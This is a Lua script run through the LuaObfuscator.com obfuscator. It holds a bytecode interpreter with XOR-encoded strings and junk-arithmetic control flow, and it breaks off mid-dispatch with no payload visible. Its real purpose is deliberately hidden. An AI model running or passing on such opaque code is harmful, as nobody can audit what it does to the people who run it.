--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do
	local v0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	local v17;
	local v18;
	local v19;
	local v20;
	local v21;
	local v22;
	local v23;
	local v24 = 0;
	while true do
		if (v24 == 2) then
			v7 = function(v25, v26, v27, v28, v29, v30, v31, v32, v33)
				local v42 = 0;
				local v43;
				while true do
					if (v42 == 1) then
						return v5(v43);
					end
					if (v42 == 0) then
						v43 = {};
						for v58 = 1, #v25 do
							v6(v43, v0(v4(v1(v2(v25, v58, v58 + 1)), v1(v2(v26, 1 + ((v58 - 1) % #v26), 1 + ((v58 - 1) % #v26) + 1))) % 256));
						end
						v42 = 1;
					end
				end
			end;
			v8 = _G[v7("\78\3\198\225\87\14\205\230", "\58\108\168\148")];
			v9 = _G[v7("\254\175\88\113\227\188", "\141\219\42\24")][v7("\130\84\9\35", "\224\45\125\70\164\216")];
			v10 = _G[v7("\105\97\242\87\52\33", "\26\21\128\62\90\70\95\128")][v7("\201\61\254\101", "\170\85\159\23\28\106\232")];
			v24 = 3;
		end
		if (v24 == 4) then
			v15 = _G[v7("\5\162\10\237\32", "\113\195\104\129\69")][v7("\214\247\225\75\5\73", "\191\153\146\46\119\61")];
			v16 = _G[v7("\63\45\220\73", "\82\76\168\33\112")][v7("\112\168\82\76\180", "\28\204\55\52\196\203")];
			v17 = _G[v7("\20\68\78\44\22\79\76", "\115\33\58\74")] or function()
				return _ENV;
			end;
			v18 = _G[v7("\105\83\220\40\130\110\87\220\36\133\118\83", "\26\54\168\69\231")];
			v24 = 5;
		end
		if (v24 == 6) then
			v23 = nil;
			v23 = function(v34, v35, ...)
				local v44 = 0;
				local v45;
				local v46;
				local v47;
				local v48;
				local v49;
				local v50;
				local v51;
				local v52;
				local v53;
				local v54;
				local v55;
				local v56;
				local v57;
				while true do
					if (v44 == 1) then
						v49 = nil;
						v50 = nil;
						v51 = nil;
						v52 = nil;
						v44 = 2;
					end
					if (v44 == 3) then
						v57 = nil;
						while true do
							local v59 = 0;
							while true do
								if (v59 == 0) then
									if (v45 == 0) then
										local v60 = 0;
										while true do
											if (v60 == 0) then
												v46 = 1 - 0;
												v47 = nil;
												v60 = 1;
											end
											if (v60 == 1) then
												v34 = v12(v11(v34, 22 - (1 + 16)), v7("\239\168", "\193\134\212\181\113"), function(v68)
													if (v9(v68, 1422 - (1055 + 365)) == (206 - 127)) then
														local v173 = 0;
														local v174;
														while true do
															if (v173 == 0) then
																v174 = 0;
																while true do
																	if (v174 == 0) then
																		local v191 = 0;
																		while true do
																			if (v191 == 0) then
																				v47 = v8(v11(v68, 1, 1 + 0 + (0 - 0)));
																				return "";
																			end
																		end
																	end
																end
																break;
															end
														end
													else
														local v175 = 0;
														local v176;
														local v177;
														while true do
															if (v175 == 1) then
																while true do
																	if (v176 == 0) then
																		v177 = v10(v8(v68, 45 - (8 + 21)));
																		if v47 then
																			local v209 = 0;
																			local v210;
																			local v211;
																			while true do
																				if (v209 == 1) then
																					while true do
																						local v238 = 0;
																						while true do
																							if (v238 == 0) then
																								if (v210 == 0) then
																									local v243 = 0;
																									while true do
																										if (v243 == 1) then
																											v210 = 1;
																											break;
																										end
																										if (v243 == 0) then
																											v211 = v13(v177, v47);
																											v47 = nil;
																											v243 = 1;
																										end
																									end
																								end
																								if (v210 == 1) then
																									return v211;
																								end
																								break;
																							end
																						end
																					end
																					break;
																				end
																				if (v209 == 0) then
																					v210 = 0;
																					v211 = nil;
																					v209 = 1;
																				end
																			end
																		else
																			return v177;
																		end
																		break;
																	end
																end
																break;
															end
															if (v175 == 0) then
																v176 = 0;
																v177 = nil;
																v175 = 1;
															end
														end
													end
												end);
												v45 = 1;
												break;
											end
										end
									end
									if (v45 == 6) then
										local v61 = 0;
										while true do
											if (1 == v61) then
												v57 = nil;
												v45 = 7;
												break;
											end
											if (v61 == 0) then
												v56 = nil;
												v56 = function(v69, v70, v71, v72, v73, v74)
													local v135 = 0;
													local v136;
													local v137;
													local v138;
													local v139;
													local v140;
													local v141;
													local v142;
													while true do
														if (v135 == 3) then
															v142 = nil;
															while true do
																local v184 = 0;
																while true do
																	if (v184 == 0) then
																		if (v136 == 0) then
																			local v194 = 0;
																			while true do
																				if (v194 == 0) then
																					v137 = {};
																					v138 = {};
																					v194 = 1;
																				end
																				if (v194 == 1) then
																					v139 = {};
																					v140 = {v137,v138,nil,v139};
																					v194 = 2;
																				end
																				if (v194 == 2) then
																					v136 = 1;
																					break;
																				end
																			end
																		end
																		if (2 == v136) then
																			local v195 = 0;
																			while true do
																				if (v195 == 0) then
																					for v216 = (2207 - 999) - ((194 - 81) + 1094), v51() do
																						local v217 = 0;
																						local v218;
																						local v219;
																						while true do
																							if (v217 == 0) then
																								v218 = 0;
																								v219 = nil;
																								v217 = 1;
																							end
																							if (1 == v217) then
																								while true do
																									if (v218 == 0) then
																										v219 = v49();
																										if (v48(v219, (1906 - (59 + 708)) - ((507 - 216) + (2470 - (1353 + 270))), 3 - 2) == ((0 - 0) + 0)) then
																											local v249 = 0;
																											local v250;
																											local v251;
																											local v252;
																											local v253;
																											while true do
																												if (v249 == 2) then
																													while true do
																														if (v250 == 0) then
																															local v274 = 0;
																															while true do
																																if (v274 == 1) then
																																	v250 = 1;
																																	break;
																																end
																																if (v274 == 0) then
																																	v251 = v48(v219, 1 + 1, (1272 - 530) - (282 + 457));
																																	v252 = v48(v219, 4, 17 - 11);
																																	v274 = 1;
																																end
																															end
																														end
																														if (2 == v250) then
																															local v275 = 0;
																															while true do
																																if (v275 == 0) then
																																	if (v48(v252, 2 - (2 - 1), 1) == 1) then
																																		v253[1987 - (1561 + 424)] = v142[v253[115 - (47 + 55 + 11)]];
																																	end
																																	if (v48(v252, 7 - 5, (4 + 1) - (1762 - (340 + 1419))) == (2 - 1)) then
																																		v253[(3 - 2) + 1 + 1] = v142[v253[610 - (184 + 423)]];
																																	end
																																	v275 = 1;
																																end
																																if (v275 == 1) then
																																	v250 = 3;
																																	break;
																																end
																															end
																														end
																														if (1 == v250) then
																															local v276 = 0;
																															while true do
																																if (v276 == 0) then
																																	v253 = {v50(),v50(),nil,nil};
																																	if (v251 == (0 + 0)) then
																																		local v291 = 0;
																																		local v292;
																																		while true do
																																			if (0 == v291) then
																																				v292 = 0;
																																				while true do
																																					if (v292 == 0) then
																																						v253[711 - (172 + (748 - 212))] = v50();
																																						v253[9 - 5] = v50();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	elseif (v251 == 1) then
																																		v253[6 - 3] = v51();
																																	elseif (v251 == 2) then
																																		v253[4 - 1] = v51() - (((2221 - (517 + 992)) - (7 + 11 + (1234 - 542))) ^ ((910 - (17 + 854)) - (1285 - (1249 + 13))));
																																	elseif (v251 == (1323 - (124 + 1196))) then
																																		local v300 = 0;
																																		local v301;
																																		while true do
																																			if (v300 == 0) then
																																				v301 = 0;
																																				while true do
																																					if (0 == v301) then
																																						v253[3] = v51() - ((1796 - (576 + 1218)) ^ ((102 - 64) - (1967 - (1026 + 919))));
																																						v253[4] = v50();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	v276 = 1;
																																end
																																if (v276 == 1) then
																																	v250 = 2;
																																	break;
																																end
																															end
																														end
																														if (v250 == 3) then
																															if (v48(v252, 849 - (767 + 79), (2036 - (1064 + 414)) - ((180 - 87) + (1591 - 1129))) == (1 + 0)) then
																																v253[2 + 2] = v142[v253[(4 + 11) - 11]];
																															end
																															v137[v216] = v253;
																															break;
																														end
																													end
																													break;
																												end
																												if (0 == v249) then
																													v250 = 0;
																													v251 = nil;
																													v249 = 1;
																												end
																												if (v249 == 1) then
																													v252 = nil;
																													v253 = nil;
																													v249 = 2;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					for v220 = 1879 - (1041 + 837), v51() do
																						v138[v220 - (1 + 0)] = v56();
																					end
																					v195 = 1;
																				end
																				if (v195 == 1) then
																					for v222 = (861 - (264 + 596)) - (1415 - (1306 + 109)), v51() do
																						v139[v222] = v51();
																					end
																					return v140;
																				end
																			end
																		end
																		v184 = 1;
																	end
																	if (v184 == 1) then
																		if (v136 == 1) then
																			local v196 = 0;
																			while true do
																				if (v196 == 2) then
																					v136 = 2;
																					break;
																				end
																				if (v196 == 1) then
																					for v224 = 1663 - (931 + 731), v141 do
																						local v225 = 0;
																						local v226;
																						local v227;
																						local v228;
																						while true do
																							if (v225 == 1) then
																								v228 = nil;
																								while true do
																									if (1 == v226) then
																										if (v227 == (3 - 2)) then
																											v228 = v49() ~= 0;
																										elseif (v227 == 2) then
																											v228 = v52();
																										elseif (v227 == (9 - 6)) then
																											v228 = v53();
																										end
																										v142[v224] = v228;
																										break;
																									end
																									if (v226 == 0) then
																										local v245 = 0;
																										while true do
																											if (v245 == 1) then
																												v226 = 1;
																												break;
																											end
																											if (v245 == 0) then
																												v227 = v49();
																												v228 = nil;
																												v245 = 1;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v225 == 0) then
																								v226 = 0;
																								v227 = nil;
																								v225 = 1;
																							end
																						end
																					end
																					v140[3 + 0] = v49();
																					v196 = 2;
																				end
																				if (v196 == 0) then
																					v141 = v51();
																					v142 = {};
																					v196 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v135 == 2) then
															v140 = nil;
															v141 = nil;
															v135 = 3;
														end
														if (v135 == 0) then
															v136 = 0;
															v137 = nil;
															v135 = 1;
														end
														if (v135 == 1) then
															v138 = nil;
															v139 = nil;
															v135 = 2;
														end
													end
												end;
												v61 = 1;
											end
										end
									end
									v59 = 1;
								end
								if (v59 == 2) then
									if (v45 == 1) then
										local v62 = 0;
										while true do
											if (0 == v62) then
												v48 = nil;
												v48 = function(v75, v76, v77, v78, v79, v80, v81, v82)
													if v77 then
														local v178 = 0;
														local v179;
														local v180;
														while true do
															if (v178 == 0) then
																v179 = 0;
																v180 = nil;
																v178 = 1;
															end
															if (v178 == 1) then
																while true do
																	if (v179 == 0) then
																		local v192 = 0;
																		while true do
																			if (v192 == 0) then
																				v180 = (v75 / (2 ^ (v76 - (1 + 0 + ((0 - 0) - 0))))) % (2 ^ (((v77 - (2 - (1 + 0))) - (v76 - ((1 + 0) - 0))) + ((1005 - (348 + 387)) - (254 + (288 - (20 + 253))))));
																				return v180 - (v180 % (1 + 0));
																			end
																		end
																	end
																end
																break;
															end
														end
													else
														local v181 = 0;
														local v182;
														local v183;
														while true do
															if (v181 == 1) then
																while true do
																	if (v182 == 0) then
																		local v193 = 0;
																		while true do
																			if (v193 == 0) then
																				v183 = ((1606 - (838 + 767)) + 1) ^ (v76 - ((3893 - (122 + 814 + 1013)) - (((1858 - (177 + 25)) - 745) + (4286 - 3254))));
																				return (((v75 % (v183 + v183)) >= v183) and ((1091 - (569 + 521)) + 0)) or (82 - (77 + 3 + 2));
																			end
																		end
																	end
																end
																break;
															end
															if (v181 == 0) then
																v182 = 0;
																v183 = nil;
																v181 = 1;
															end
														end
													end
												end;
												v62 = 1;
											end
											if (v62 == 1) then
												v49 = nil;
												v45 = 2;
												break;
											end
										end
									end
									if (v45 == 7) then
										local v63 = 0;
										while true do
											if (v63 == 0) then
												v57 = function(v83, v84, v85, v86, v87, v88, v89, v90, v91, v92, v93, v94, v95)
													local v143 = 0;
													local v144;
													local v145;
													local v146;
													local v147;
													while true do
														if (v143 == 0) then
															v144 = 0;
															v145 = nil;
															v143 = 1;
														end
														if (v143 == 2) then
															while true do
																local v185 = 0;
																while true do
																	if (v185 == 0) then
																		if (v144 == 1) then
																			local v197 = 0;
																			while true do
																				if (v197 == 0) then
																					v147 = v83[1 + 2];
																					return function(...)
																						local v229 = 0;
																						local v230;
																						local v231;
																						local v232;
																						local v233;
																						local v234;
																						local v235;
																						while true do
																							if (v229 == 2) then
																								v234 = nil;
																								v235 = nil;
																								v229 = 3;
																							end
																							if (v229 == 1) then
																								v232 = nil;
																								v233 = nil;
																								v229 = 2;
																							end
																							if (v229 == 0) then
																								v230 = 0;
																								v231 = nil;
																								v229 = 1;
																							end
																							if (3 == v229) then
																								while true do
																									if (v230 == 2) then
																										local v246 = 0;
																										while true do
																											if (v246 == 1) then
																												v230 = 3;
																												break;
																											end
																											if (v246 == 0) then
																												v235 = nil;
																												v235 = function(v257, v258, v259, v260, v261, v262)
																													local v263 = 0;
																													local v264;
																													local v265;
																													local v266;
																													local v267;
																													local v268;
																													local v269;
																													local v270;
																													local v271;
																													local v272;
																													local v273;
																													while true do
																														if (v263 == 2) then
																															v271 = (v234 - v266) + 1 + 0;
																															v272 = nil;
																															v273 = nil;
																															while true do
																																local v278 = 0;
																																local v279;
																																while true do
																																	if (v278 == 0) then
																																		v279 = 0;
																																		while true do
																																			if (v279 == 1) then
																																				if (v273 <= (1788 - (397 + 1377))) then
																																					if (v273 <= 6) then
																																						if (v273 <= 2) then
																																							if (v273 <= ((2053 - (856 + 281)) - ((782 - 399) + (1431 - 898)))) then
																																								v270[v272[(1193 - (1158 + 33)) + 0 + 0]] = v270[v272[3]] % v272[4];
																																							elseif (v273 == 1) then
																																								local v307 = 0;
																																								local v308;
																																								local v309;
																																								local v310;
																																								local v311;
																																								local v312;
																																								while true do
																																									if (v307 == 1) then
																																										v310 = nil;
																																										v311 = nil;
																																										v307 = 2;
																																									end
																																									if (v307 == 0) then
																																										v308 = 0;
																																										v309 = nil;
																																										v307 = 1;
																																									end
																																									if (v307 == 2) then
																																										v312 = nil;
																																										while true do
																																											if (v308 == 2) then
																																												for v402 = v309, v232 do
																																													local v403 = 0;
																																													local v404;
																																													while true do
																																														if (v403 == 0) then
																																															v404 = 0;
																																															while true do
																																																if (v404 == 0) then
																																																	v312 = v312 + 1 + 0 + 0;
																																																	v270[v402] = v310[v312];
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																												break;
																																											end
																																											if (v308 == 1) then
																																												local v382 = 0;
																																												while true do
																																													if (v382 == 1) then
																																														v308 = 2;
																																														break;
																																													end
																																													if (v382 == 0) then
																																														v232 = (v311 + v309) - 1;
																																														v312 = (0 + 0) - (1081 - (522 + 559));
																																														v382 = 1;
																																													end
																																												end
																																											end
																																											if (v308 == 0) then
																																												local v383 = 0;
																																												while true do
																																													if (v383 == 0) then
																																														v309 = v272[2];
																																														v310, v311 = v267(v270[v309](v270[v309 + (1742 - (90 + 1651))]));
																																														v383 = 1;
																																													end
																																													if (v383 == 1) then
																																														v308 = 1;
																																														break;
																																													end
																																												end
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							else
																																								v231 = v272[(1018 - (206 + 25)) - (702 + (1856 - (644 + 1130)))];
																																							end
																																						elseif (v273 <= ((810 - (530 + 272)) - (8 - 4))) then
																																							if (v273 > 3) then
																																								local v314 = 0;
																																								local v315;
																																								local v316;
																																								local v317;
																																								local v318;
																																								while true do
																																									if (v314 == 1) then
																																										v317 = nil;
																																										v318 = nil;
																																										v314 = 2;
																																									end
																																									if (v314 == 2) then
																																										while true do
																																											if (0 == v315) then
																																												local v384 = 0;
																																												while true do
																																													if (v384 == 0) then
																																														v316 = v272[(4368 - 2770) - ((2196 - 1626) + 1026)];
																																														v317 = v270[v316];
																																														v384 = 1;
																																													end
																																													if (v384 == 1) then
																																														v315 = 1;
																																														break;
																																													end
																																												end
																																											end
																																											if (v315 == 1) then
																																												v318 = v270[v316 + ((13 - 9) - 2)];
																																												if (v318 > ((1656 - 766) - (450 + 203 + (435 - 198)))) then
																																													if (v317 > v270[v316 + (298 - (193 + 104))]) then
																																														v231 = v272[(2243 - 1157) - ((1349 - (419 + 310)) + (1772 - 1309))];
																																													else
																																														v270[v316 + (1977 - (376 + 1598))] = v317;
																																													end
																																												elseif (v317 < v270[v316 + 1]) then
																																													v231 = v272[3];
																																												else
																																													v270[v316 + (299 - (7 + 289)) + 0 + 0] = v317;
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (0 == v314) then
																																										v315 = 0;
																																										v316 = nil;
																																										v314 = 1;
																																									end
																																								end
																																							else
																																								v270[v272[2]] = v270[v272[3]] + v272[(23 - 13) - (5 + 1)];
																																							end
																																						elseif (v273 == 5) then
																																							v270[v272[1378 - (610 + 766)]] = #v270[v272[3 + 0]];
																																						else
																																							local v321 = 0;
																																							local v322;
																																							local v323;
																																							while true do
																																								if (v321 == 1) then
																																									while true do
																																										if (v322 == 0) then
																																											v323 = v272[2 + 0];
																																											v270[v323](v21(v270, v323 + 1, v232));
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v321 == 0) then
																																									v322 = 0;
																																									v323 = nil;
																																									v321 = 1;
																																								end
																																							end
																																						end
																																					elseif (v273 <= (15 - 5)) then
																																						if (v273 <= (834 - (152 + 674))) then
																																							if (v273 > ((1935 - (133 + 1779)) - (10 + 6))) then
																																								local v324 = 0;
																																								local v325;
																																								local v326;
																																								local v327;
																																								local v328;
																																								local v329;
																																								while true do
																																									if (v324 == 2) then
																																										v329 = nil;
																																										while true do
																																											if (v325 == 2) then
																																												for v405 = v326, v232 do
																																													local v406 = 0;
																																													local v407;
																																													while true do
																																														if (v406 == 0) then
																																															v407 = 0;
																																															while true do
																																																if (v407 == 0) then
																																																	v329 = v329 + 1;
																																																	v270[v405] = v327[v329];
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																												break;
																																											end
																																											if (1 == v325) then
																																												local v387 = 0;
																																												while true do
																																													if (v387 == 0) then
																																														v232 = (v328 + v326) - (1 + 0 + 0 + 0);
																																														v329 = (0 - 0) - (863 - (748 + 115));
																																														v387 = 1;
																																													end
																																													if (v387 == 1) then
																																														v325 = 2;
																																														break;
																																													end
																																												end
																																											end
																																											if (v325 == 0) then
																																												local v388 = 0;
																																												while true do
																																													if (v388 == 1) then
																																														v325 = 1;
																																														break;
																																													end
																																													if (v388 == 0) then
																																														v326 = v272[1162 - ((1882 - 784) + (335 - (211 + 62)))];
																																														v327, v328 = v267(v270[v326](v21(v270, v326 + 1, v232)));
																																														v388 = 1;
																																													end
																																												end
																																											end
																																										end
																																										break;
																																									end
																																									if (v324 == 0) then
																																										v325 = 0;
																																										v326 = nil;
																																										v324 = 1;
																																									end
																																									if (v324 == 1) then
																																										v327 = nil;
																																										v328 = nil;
																																										v324 = 2;
																																									end
																																								end
																																							else
																																								v270[v272[3 - 1]]();
																																							end
																																						elseif (v273 > (809 - (665 + 135))) then
																																							local v330 = 0;
																																							local v331;
																																							local v332;
																																							while true do
																																								if (v330 == 1) then
																																									while true do
																																										if (v331 == 0) then
																																											v332 = v272[2 + 0];
																																											do
																																												return v270[v332](v21(v270, v332 + (1085 - (484 + 600)), v272[3]));
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v330 == 0) then
																																									v331 = 0;
																																									v332 = nil;
																																									v330 = 1;
																																								end
																																							end
																																						else
																																							v270[v272[2 + (1872 - (817 + 1055))]] = v270[v272[608 - (502 + 103)]] - v272[4];
																																						end
																																					elseif (v273 <= ((663 - (591 + 67)) + (18 - 11))) then
																																						if (v273 == (1079 - (524 + 544))) then
																																							if not v270[v272[1 + 1]] then
																																								v231 = v231 + ((1094 - 257) - ((522 - 246) + 560));
																																							else
																																								v231 = v272[14 - 11];
																																							end
																																						else
																																							do
																																								return;
																																							end
																																						end
																																					elseif (v273 > (1099 - (159 + 927))) then
																																						local v334 = 0;
																																						local v335;
																																						local v336;
																																						local v337;
																																						local v338;
																																						local v339;
																																						while true do
																																							if (v334 == 0) then
																																								v335 = 0;
																																								v336 = nil;
																																								v334 = 1;
																																							end
																																							if (v334 == 1) then
																																								v337 = nil;
																																								v338 = nil;
																																								v334 = 2;
																																							end
																																							if (v334 == 2) then
																																								v339 = nil;
																																								while true do
																																									if (1 == v335) then
																																										local v390 = 0;
																																										while true do
																																											if (v390 == 1) then
																																												v335 = 2;
																																												break;
																																											end
																																											if (v390 == 0) then
																																												v232 = (v338 + v336) - 1;
																																												v339 = 0 - 0;
																																												v390 = 1;
																																											end
																																										end
																																									end
																																									if (v335 == 0) then
																																										local v391 = 0;
																																										while true do
																																											if (0 == v391) then
																																												v336 = v272[5 - 3];
																																												v337, v338 = v267(v270[v336](v21(v270, v336 + 1, v272[3 + 0])));
																																												v391 = 1;
																																											end
																																											if (v391 == 1) then
																																												v335 = 1;
																																												break;
																																											end
																																										end
																																									end
																																									if (v335 == 2) then
																																										for v408 = v336, v232 do
																																											local v409 = 0;
																																											local v410;
																																											while true do
																																												if (0 == v409) then
																																													v410 = 0;
																																													while true do
																																														if (v410 == 0) then
																																															v339 = v339 + ((52 + 1470) - (1189 + (1332 - 1000)));
																																															v270[v408] = v337[v339];
																																															break;
																																														end
																																													end
																																													break;
																																												end
																																											end
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					else
																																						v270[v272[9 - 7]] = v85[v272[3]];
																																					end
																																				elseif (v273 <= 21) then
																																					if (v273 <= (10 + 7)) then
																																						if (v273 <= 15) then
																																							local v303 = 0;
																																							local v304;
																																							local v305;
																																							local v306;
																																							while true do
																																								if (v303 == 0) then
																																									v304 = 0;
																																									v305 = nil;
																																									v303 = 1;
																																								end
																																								if (v303 == 1) then
																																									v306 = nil;
																																									while true do
																																										if (v304 == 1) then
																																											v270[v305 + ((3312 - (1050 + 393)) - (112 + 466 + 1290))] = v306;
																																											v270[v305] = v306[v272[(616 + 96) - ((1938 - 1309) + 79)]];
																																											break;
																																										end
																																										if (v304 == 0) then
																																											local v381 = 0;
																																											while true do
																																												if (v381 == 1) then
																																													v304 = 1;
																																													break;
																																												end
																																												if (v381 == 0) then
																																													v305 = v272[2 + 0];
																																													v306 = v270[v272[1 + 2]];
																																													v381 = 1;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						elseif (v273 == ((392 - (15 + 375)) + 11 + 3)) then
																																							v270[v272[2 + 0]] = v270[v272[(340 - (293 + 46)) + 2 + 0]] % v270[v272[3 + 1]];
																																						else
																																							v270[v272[2 + 0]] = v270[v272[(626 - (207 + 418)) + (1363 - (641 + 720))]][v272[(700 - (89 + 39)) - ((1755 - (1173 + 362)) + (713 - 365))]];
																																						end
																																					elseif (v273 <= ((274 - 217) - (1349 - (621 + 690)))) then
																																						if (v273 == 18) then
																																							local v345 = 0;
																																							local v346;
																																							local v347;
																																							while true do
																																								if (v345 == 0) then
																																									v346 = 0;
																																									v347 = nil;
																																									v345 = 1;
																																								end
																																								if (v345 == 1) then
																																									while true do
																																										if (v346 == 0) then
																																											v347 = v272[2];
																																											v270[v347] = v270[v347](v21(v270, v347 + (3 - 2), v232));
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						else
																																							v270[v272[679 - (201 + 476)]] = {};
																																						end
																																					elseif (v273 == (38 - 18)) then
																																						v85[v272[3 + 0]] = v270[v272[2 + 0]];
																																					else
																																						local v351 = 0;
																																						local v352;
																																						local v353;
																																						local v354;
																																						local v355;
																																						while true do
																																							if (v351 == 2) then
																																								while true do
																																									if (v352 == 2) then
																																										if (v354 > (0 - (1516 - (879 + 637)))) then
																																											if (v355 <= v270[v353 + 1 + 0]) then
																																												local v433 = 0;
																																												local v434;
																																												while true do
																																													if (v433 == 0) then
																																														v434 = 0;
																																														while true do
																																															if (v434 == 0) then
																																																v231 = v272[1125 - (241 + 881)];
																																																v270[v353 + 3] = v355;
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																										elseif (v355 >= v270[v353 + ((3 - 2) - (0 - 0))]) then
																																											local v435 = 0;
																																											local v436;
																																											while true do
																																												if (v435 == 0) then
																																													v436 = 0;
																																													while true do
																																														if (v436 == 0) then
																																															v231 = v272[(317 - (74 + 229)) - (2004 - (1486 + 507))];
																																															v270[v353 + ((555 - 170) - (310 + (1666 - (276 + 1318))))] = v355;
																																															break;
																																														end
																																													end
																																													break;
																																												end
																																											end
																																										end
																																										break;
																																									end
																																									if (v352 == 0) then
																																										local v394 = 0;
																																										while true do
																																											if (v394 == 1) then
																																												v352 = 1;
																																												break;
																																											end
																																											if (v394 == 0) then
																																												v353 = v272[173 - ((212 - 113) + 49 + 23)];
																																												v354 = v270[v353 + (111 - (7 + 102))];
																																												v394 = 1;
																																											end
																																										end
																																									end
																																									if (v352 == 1) then
																																										local v395 = 0;
																																										while true do
																																											if (1 == v395) then
																																												v352 = 2;
																																												break;
																																											end
																																											if (v395 == 0) then
																																												v355 = v270[v353] + v354;
																																												v270[v353] = v355;
																																												v395 = 1;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (v351 == 1) then
																																								v354 = nil;
																																								v355 = nil;
																																								v351 = 2;
																																							end
																																							if (0 == v351) then
																																								v352 = 0;
																																								v353 = nil;
																																								v351 = 1;
																																							end
																																						end
																																					end
																																				elseif (v273 <= (88 - 63)) then
																																					if (v273 <= 23) then
																																						if (v273 > 22) then
																																							v270[v272[(4 + 0) - (682 - (367 + 313))]] = v272[(2022 - (1267 + 584)) - ((18 - 3) + 153)] + v270[v272[(52 + 187) - ((74 - 32) + 193)]];
																																						else
																																							v270[v272[2]] = v272[(571 + 33) - (77 + (1509 - 985))] ~= (588 - (155 + 433));
																																						end
																																					elseif (v273 > (59 - 35)) then
																																						local v358 = 0;
																																						local v359;
																																						local v360;
																																						local v361;
																																						local v362;
																																						while true do
																																							if (v358 == 0) then
																																								v359 = 0;
																																								v360 = nil;
																																								v358 = 1;
																																							end
																																							if (v358 == 1) then
																																								v361 = nil;
																																								v362 = nil;
																																								v358 = 2;
																																							end
																																							if (2 == v358) then
																																								while true do
																																									if (v359 == 1) then
																																										local v396 = 0;
																																										while true do
																																											if (v396 == 1) then
																																												v359 = 2;
																																												break;
																																											end
																																											if (v396 == 0) then
																																												v362 = {};
																																												v361 = v18({}, {[v7("\187\122\170\114\173\50\74", "\228\37\195\28\201\87\50")]=function(v425, v426)
																																													local v437 = 0;
																																													local v438;
																																													local v439;
																																													while true do
																																														if (v437 == 0) then
																																															v438 = 0;
																																															v439 = nil;
																																															v437 = 1;
																																														end
																																														if (v437 == 1) then
																																															while true do
																																																if (v438 == 0) then
																																																	local v457 = 0;
																																																	while true do
																																																		if (v457 == 0) then
																																																			v439 = v362[v426];
																																																			return v439[(2 + 0) - (1 - 0)][v439[(3 - 2) + 1]];
																																																		end
																																																	end
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end,[v7("\156\58\119\217\232\38\29\20\166\29", "\195\101\25\188\159\79\115\112")]=function(v425, v426, v427)
																																													local v440 = 0;
																																													local v441;
																																													local v442;
																																													while true do
																																														if (v440 == 1) then
																																															while true do
																																																if (v441 == 0) then
																																																	v442 = v362[v426];
																																																	v442[1 + 0 + 0][v442[2]] = v427;
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																														if (v440 == 0) then
																																															v441 = 0;
																																															v442 = nil;
																																															v440 = 1;
																																														end
																																													end
																																												end});
																																												v396 = 1;
																																											end
																																										end
																																									end
																																									if (v359 == 0) then
																																										local v397 = 0;
																																										while true do
																																											if (v397 == 1) then
																																												v359 = 1;
																																												break;
																																											end
																																											if (v397 == 0) then
																																												v360 = v265[v272[2 + 1]];
																																												v361 = nil;
																																												v397 = 1;
																																											end
																																										end
																																									end
																																									if (v359 == 2) then
																																										for v413 = 1 - 0, v272[(36 - 25) - (9 - 2)] do
																																											local v414 = 0;
																																											local v415;
																																											local v416;
																																											while true do
																																												if (0 == v414) then
																																													v415 = 0;
																																													v416 = nil;
																																													v414 = 1;
																																												end
																																												if (1 == v414) then
																																													while true do
																																														if (v415 == 0) then
																																															local v449 = 0;
																																															while true do
																																																if (v449 == 1) then
																																																	v415 = 1;
																																																	break;
																																																end
																																																if (v449 == 0) then
																																																	v231 = v231 + 1;
																																																	v416 = v264[v231];
																																																	v449 = 1;
																																																end
																																															end
																																														end
																																														if (v415 == 1) then
																																															if (v416[(1614 - (939 + 674)) + 0 + 0] == (72 - 43)) then
																																																v362[v413 - ((625 + 519) - ((2149 - (660 + 566)) + (930 - (610 + 100))))] = {v270,v416[1061 - (206 + 852)]};
																																															else
																																																v362[v413 - ((7256 - 5383) - (1203 + (2640 - (574 + 1397))))] = {v84,v416[5 - 2]};
																																															end
																																															v269[#v269 + (1 - 0)] = v362;
																																															break;
																																														end
																																													end
																																													break;
																																												end
																																											end
																																										end
																																										v270[v272[2]] = v57(v360, v361, v85);
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					else
																																						local v363 = 0;
																																						local v364;
																																						local v365;
																																						while true do
																																							if (v363 == 0) then
																																								v364 = 0;
																																								v365 = nil;
																																								v363 = 1;
																																							end
																																							if (v363 == 1) then
																																								while true do
																																									if (v364 == 0) then
																																										v365 = v272[2 + 0];
																																										v270[v365] = v270[v365](v21(v270, v365 + (1 - (0 - 0)), v272[1 + 2]));
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v273 <= 27) then
																																					if (v273 > (97 - 71)) then
